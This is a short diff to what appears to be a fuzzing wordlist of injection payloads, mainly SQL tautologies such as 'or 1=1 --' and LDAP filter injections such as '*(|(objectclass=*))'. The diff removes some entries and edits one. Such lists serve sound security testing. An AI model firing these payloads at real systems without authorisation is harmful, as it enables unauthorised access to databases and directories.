@@ -3,7 +3,7 @@
 #
 -
 --
-'%20--
+'%20
 --';
 '%20;
 =%20'
@@ -42,13 +42,6 @@ or%201=1 --
 " or "a"="a
 ') or ('a'='a
 ") or ("a"="a
-hi" or "a"="a
-hi" or 1=1 --
-hi' or 1=1 --
-hi' or 'a'='a
-hi') or ('a'='a
-hi") or ("a"="a
-'hi' or 'x'='x';
 @variable
 ,@variable
 PRINT
@@ -108,9 +101,7 @@ char%4039%41%2b%40SELECT
 %2A%28%7C%28mail%3D%2A%29%29
 *(|(objectclass=*))
 %2A%28%7C%28objectclass%3D%2A%29%29
-(
 %28
-)
 %29
 &
 %26
